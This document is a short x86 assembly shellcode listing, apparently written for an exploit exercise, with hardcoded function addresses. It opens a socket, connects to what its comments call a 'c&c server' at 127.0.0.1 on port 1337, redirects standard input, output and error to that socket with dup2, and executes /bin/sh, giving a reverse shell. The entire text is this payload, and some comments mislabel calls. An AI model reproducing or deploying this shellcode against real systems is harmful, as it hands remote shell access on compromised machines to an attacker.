
sub     esp, 1500
push    ebp
mov     ebp, esp

sub esp, 52;
sub     esp, 4								#create socket to connect to the c&c server
push    0               # protocol
push    1               # type
push    2               # family
mov eax, 0x08048730	;						#call socket, put inside eax the address of the socket function
call eax;
add esp, 16;
mov [ebp-36], eax;							#save the socket
sub esp, 12;


jmp _want_host;

_got_host:
pop ebx;
push ebx;    						#push "127.0.0.1" ip
mov eax, 0x08048740;						#call iner_addr, put inside eax the address of the iner_addr function
call eax;


add     esp, 16
mov     [ebp-24], eax;						# server.sin_addr.s_addr = inet_addr("127.0.0.1");
mov     word ptr [ebp-28], 2;				# server.sin_family = AF_INET;
sub     esp, 14

push    1337;            					#parameter to htons
mov eax, 0x08048640;							#call    _htons
call eax;


add     esp, 16
mov     [ebp-26], ax
sub     esp, 4
push    16              # int
lea     eax, [ebp-28]
push    eax             # struct sockaddr *
push    dword ptr [ebp-36] # int

mov eax, 0x08048750										#call    _connect
call eax;


add     esp, 16
sub     esp, 8
push    1               # fildes2
push    dword ptr [ebp-36] # fildes

mov eax, 0x08048600										#call    _dup2
call eax;

add     esp, 16
sub     esp, 8
push    2               # fildes2
push    dword ptr [ebp-36] # fildes

mov eax, 0x08048600										#call    _dup2
call eax;

add     esp, 16
sub     esp, 8
push    0               # fildes2
push    dword ptr [ebp-36] # fildes

mov eax, 0x08048600										#call    _dup2
call eax;
add     esp, 16


jmp _want_bin_sh;								#to get the string for execv function.

_got_bin_sh:

	      

	pop ebx;								#this is the string "/bin/sh"
	xor eax, eax;
	push eax;
	push ebx;
	mov eax, 0x080486D0;					#call iner_addr, put inside eax the address of the iner_addr function
	call eax;





_want_host:									#get the "127.0.0.1" string.
	call _got_host;
	.string "127.0.0.1";

_want_bin_sh:
	call _got_bin_sh;
	.string "/bin/sh";